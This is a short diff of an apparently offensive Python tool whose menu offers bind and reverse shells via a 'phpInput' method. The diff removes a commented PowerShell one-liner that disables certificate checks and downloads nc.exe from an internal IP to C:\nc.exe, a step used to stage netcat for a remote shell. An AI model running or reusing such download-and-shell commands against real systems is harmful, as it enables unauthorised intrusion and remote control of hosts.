@@ -318,7 +318,6 @@ def com(method):
 	elif choice == 2 and method == 'phpInput': shells(method, 'bind')
 	elif choice == 3 and method == 'phpInput': shells(method, 'reverse')
 
-#powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true}; $source="""http://192.168.1.5/nc.exe """; $destination= """C:\\nc.exe"""; $http = new-object System.Net.WebClient; $response= $http.DownloadFile($source, $destination);"
 try: input = raw_input
 except: pass
 
